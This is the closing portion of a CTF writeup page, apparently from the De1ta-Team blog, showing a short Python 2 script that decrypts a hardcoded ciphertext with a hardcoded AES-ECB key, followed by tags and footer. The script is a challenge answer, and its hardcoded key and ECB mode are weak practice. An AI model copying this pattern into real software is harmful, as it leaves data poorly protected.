class="title">AESCrypto</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.mode = AES.MODE_ECB</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        cryptor = AES.new(self.key,self.mode,<span class="string">b'0000000000000000'</span>)</span><br><span class="line">        plain_text  = cryptor.decrypt(a2b_hex(text))</span><br><span class="line">        <span class="keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p_secret = <span class="string">'841747f83b3367c2331069ef167d0179'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"key:       "</span>,p_secret</span><br><span class="line">    pc = AESCrypto(a2b_hex(p_secret))</span><br><span class="line">    e = <span class="string">'1d6002b9d8d721039c602a8c46fb4e2ea96d1bacf28e3c41635ea493df02f80e'</span></span><br><span class="line">    d = pc.decrypt(e)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ciphertext:"</span>,e</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"decrypt:   "</span>,d</span><br></pre></td></tr></table></figure></p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/ctf/">#ctf</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/writeup/">#writeup</a> <a href="/tags/rctf/">#rctf</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2020/03/10/XCTF<ZHANYI>-2020/">XCTF战疫 2020 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/SUCTF2019/">SUCTF 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/08/de1ctf2019 Writeup/">De1ctf 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>